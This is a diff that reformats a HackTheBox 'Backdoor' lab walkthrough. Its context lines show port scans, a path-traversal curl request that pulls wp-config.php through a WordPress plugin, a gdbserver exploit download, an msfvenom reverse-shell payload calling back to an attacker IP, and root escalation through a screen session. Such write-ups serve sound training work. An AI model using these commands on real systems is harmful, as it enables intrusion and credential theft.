@@ -1,3 +1,4 @@
+# HTB - Backdoor
 
 **IP Address:** `10.10.11.125`  
 **OS:** Linux  
@@ -5,7 +6,6 @@
 **Tags:** #WordPress, #PluginExploit, #FileDisclosure, #ProcBruteforce, #GDBServer, #PrivilegeEscalation, #Screen
 
 ---
-
 ## Synopsis
 
 Backdoor is an easy Linux machine running a WordPress installation with a vulnerable plugin allowing arbitrary file downloads.  
@@ -14,7 +14,6 @@ This service is exploited for remote code execution, granting a foothold.
 Privilege escalation is achieved by attaching to an existing root `screen` session.
 
 ---
-
 ## Skills Required
 
 - Basic web enumeration
@@ -38,7 +37,7 @@ Privilege escalation is achieved by attaching to an existing root `screen` sessi
 
 Check if the host is reachable:
 
-``` bash
+```bash
 ping -c 1 10.10.11.125
 ```
 
@@ -52,7 +51,7 @@ The machine responds, confirming it is alive.
 
 Scan all TCP ports:
 
-``` bash
+```bash
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.125 -oG allPorts
 ```
 
@@ -68,7 +67,7 @@ Extract open ports:
 
 Perform a deeper scan on the identified open ports:
 
-``` bash
+```bash
 nmap -sCV -p22,80,1337 10.10.11.125 -oN targeted
 ```
 
@@ -88,13 +87,13 @@ Open ports:
 
 To simplify navigation, add the host to `/etc/hosts`:
 
-``` bash
+```bash
 echo "10.10.11.125 backdoor.htb" | sudo tee -a /etc/hosts
 ```
 
 Identify the CMS:
 
-``` bash
+```bash
 whatweb http://10.10.11.125
 ```
 
@@ -112,7 +111,7 @@ The homepage is a default WordPress theme with minimal content.
 
 Attempt to access the default login endpoint:
 
-``` bash
+```bash
 http://10.10.11.125/wp-login.php
 ```
 
@@ -127,7 +126,7 @@ Default credentials failed.
 By default, `/wp-content/plugins` should have a blank `index.php` to prevent directory listing.  
 Here, the file is missing, allowing us to browse the directory:
 
-``` bash
+```bash
 http://10.10.11.125/wp-content/plugins/
 ```
 
@@ -144,7 +143,7 @@ Two plugins found:
 
 Search for known exploits:
 
-``` bash
+```bash
 searchsploit ebook download
 ```
 
@@ -160,7 +159,7 @@ The vulnerability allows path traversal via:
 
 Retrieve `wp-config.php`:
 
-``` bash
+```bash
 curl -s -X GET "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php"
 ```
 
@@ -237,13 +236,13 @@ Search for exploits:
 
 Download exploit:
 
-``` bash
+```bash
 searchsploit -m linux/remote/50539.py
 ```
 
 Prepare reverse shell payload:
 
-``` bash
+```bash
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.7 LPORT=443 PrependFork=true -o rev.bin
 ```
 
@@ -269,7 +268,7 @@ ps -faux | grep screen
 
 Found:
 
-``` bash
+```bash
 find /var/run/screen/S-root -empty -exec screen -dmS root ;
 ```
 
@@ -289,13 +288,13 @@ This command checks if `/var/run/screen/S-root` is empty and, if so, starts a de
 
 Check execution path:
 
-``` bash
+```bash
 which screen | xargs ls -l
 ```
 
 Attach to root session:
 
-``` bash
+```bash
 TERM=xterm screen -x root/
 ```
 
